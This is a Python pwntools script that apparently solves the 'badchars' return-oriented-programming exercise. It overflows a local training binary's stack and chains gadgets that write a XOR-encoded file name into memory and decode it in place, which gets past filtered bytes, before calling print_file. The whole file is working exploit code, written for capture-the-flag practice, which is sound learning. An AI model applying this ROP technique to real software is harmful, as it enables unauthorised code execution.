#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

context.terminal = 'kitty'

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

#==================== Payload utils ========================

# Input utente
dummy_input = b'A' * 32

# Salta EBX
ebx = p64(0)

# 0x00400510 GLOBAL FUNC print_file
print_func = p64(0x400510)

# Adrress rw
write_addr = p64(0x601040)

write_addr_int = 0x601040

# xor key
flag = b'V\QWZDHD'


#====================== Gadget payload =====================

# 0x00000000004004ee : ret
retv = p64(0x4004ee)

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12_r13_r14_r15 = p64(0x40069c)

# 0x00000000004006a0 : pop r14 ; pop r15 ; ret 
pop_r14_r15 = p64(0x4006a0)

# 0x00000000004006a3 : pop rdi ; ret 
pop_rdi = p64(0x4006a3)

# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
move = p64(0x400634)

# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
xor_gdt = p64(0x400628)

#===================== Payload preps ======================
poppers = pop_r12_r13_r14_r15 + flag + write_addr + p64(0) + p64(0) + move

xoratore = b''
for i in range(8):
    if 4 == i:
        xoratore += pop_r14_r15 + b't0000000' + p64(write_addr_int + i) + xor_gdt
    else:
        xoratore += pop_r14_r15 + b'00000000' + p64(write_addr_int + i) + xor_gdt

# Payload di attacco
#
# 1 => Input utente
# 2 => ebx
# 3 => return gadget
payload = dummy_input + ebx + retv + poppers + xoratore + pop_rdi + write_addr + print_func  

io.sendlineafter(b'> ', payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

